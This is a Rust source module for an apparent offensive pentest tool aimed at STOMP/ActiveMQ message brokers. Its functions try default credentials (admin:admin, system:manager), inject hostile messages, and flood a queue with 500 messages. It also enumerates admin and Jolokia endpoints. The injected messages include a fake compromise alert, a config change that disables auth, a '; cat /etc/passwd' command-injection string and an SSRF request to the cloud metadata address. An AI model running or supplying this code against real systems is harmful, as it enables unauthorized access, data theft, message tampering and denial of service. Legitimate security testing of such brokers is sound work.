use colored::Colorize;
use reqwest::Client;
use std::time::Duration;

fn build_client(timeout: u64) -> Client {
    Client::builder().timeout(Duration::from_secs(timeout)).redirect(reqwest::redirect::Policy::none()).build().unwrap_or_else(|_| Client::new())
}

pub async fn connect(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} STOMP Connection Test", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let resp = client.get(url).send().await?;
    let status = resp.status().as_u16();
    let body = resp.text().await.unwrap_or_default();

    if status == 200 && (body.contains("stomp") || body.contains("STOMP") || body.contains("activemq")) {
        println!("  {} STOMP/ActiveMQ service detected", "[+]".green().bold());
    }

    let default_creds = [("admin", "admin"), ("system", "manager"), ("guest", "guest"), ("admin", "password")];
    for (user, pass) in &default_creds {
        match client.get(url).basic_auth(user, Some(pass)).send().await {
            Ok(r) => {
                let s = r.status().as_u16();
                if s == 200 {
                    println!("  {} {:10}:{:10} — LOGIN SUCCESS", "[+]".green().bold(), user, pass);
                }
            }
            Err(_) => {}
        }
    }

    Ok(())
}

pub async fn inject(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} STOMP Message Injection", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let payloads = [
        ("Poison message", "CONSUMER_QUEUE", "poison", "MALICIOUS_STOMP_MESSAGE"),
        ("Fake alert", "ALERT_TOPIC", "alerts", "{\"type\":\"critical\",\"msg\":\"System compromised\"}"),
        ("Config override", "CONFIG_TOPIC", "config", "{\"debug\":true,\"auth\":\"disabled\"}"),
        ("Command injection", "CMD_QUEUE", "commands", "; cat /etc/passwd"),
        ("SSRF payload", "WEBHOOK_TOPIC", "webhooks", "http://169.254.169.254/latest/meta-data/"),
    ];

    for (name, dest, routing, payload) in &payloads {
        let body = serde_json::json!({"action": "send", "destination": dest, "routing_key": routing, "message": payload});
        match client.post(url).json(&body).send().await {
            Ok(r) => {
                let status = r.status().as_u16();
                let text = r.text().await.unwrap_or_default();
                let success = text.contains("sent") || text.contains("ok") || status == 200;
                let tag = if success { "SENT".red().bold().to_string() } else { format!("status={}", status) };
                println!("  {} {:20} -> {:15} {}", "*".cyan(), name, dest, tag);
            }
            Err(_) => println!("  {} {:20} error", "[-]".dimmed(), name),
        }
    }

    Ok(())
}

pub async fn flood(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} STOMP Queue Flooding", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let mut sent = 0u32;
    let mut errors = 0u32;

    for i in 0..500u32 {
        let body = serde_json::json!({"action": "send", "destination": "FLOOD_QUEUE", "message": format!("FLOOD_MSG_{}", i)});
        match client.post(url).json(&body).send().await {
            Ok(r) => {
                let status = r.status().as_u16();
                if status == 200 { sent += 1; } else { errors += 1; }
            }
            Err(_) => { errors += 1; }
        }
        if i % 100 == 0 && i > 0 {
            println!("  {} Progress: {} sent, {} errors", "*".cyan(), sent, errors);
        }
    }

    println!("\n  {} Results: {} sent, {} errors", "[*]".cyan().bold(), sent, errors);
    if sent > 400 {
        println!("  {} Queue flooding successful — server accepted most messages.", "[!]".red().bold());
    }

    Ok(())
}

pub async fn enumerate(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} STOMP Enumeration", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let enum_endpoints = [
        ("Admin", "/admin"),
        ("Queues", "/admin/queues.jsp"),
        ("Topics", "/admin/topics.jsp"),
        ("Subscribers", "/admin/subscribers.jsp"),
        ("Connections", "/admin/connections.jsp"),
        ("Network", "/admin/network.jsp"),
        ("Stats", "/api/jolokia/read/org.apache.activemq:type=Broker,brokerName=*"),
    ];

    for (name, ep) in &enum_endpoints {
        let target = format!("{}{}", url.trim_end_matches('/'), ep);
        match client.get(&target).basic_auth("admin", Some("admin")).send().await {
            Ok(r) => {
                let status = r.status().as_u16();
                let text = r.text().await.unwrap_or_default();
                if status == 200 && !text.is_empty() {
                    println!("  {} {:20} — {} bytes", "[+]".green().bold(), name, text.len());
                } else {
                    println!("  {} {:20} — status={}", "[-]".dimmed(), name, status);
                }
            }
            Err(_) => println!("  {} {:20} — error", "[-]".dimmed(), name),
        }
    }

    Ok(())
}
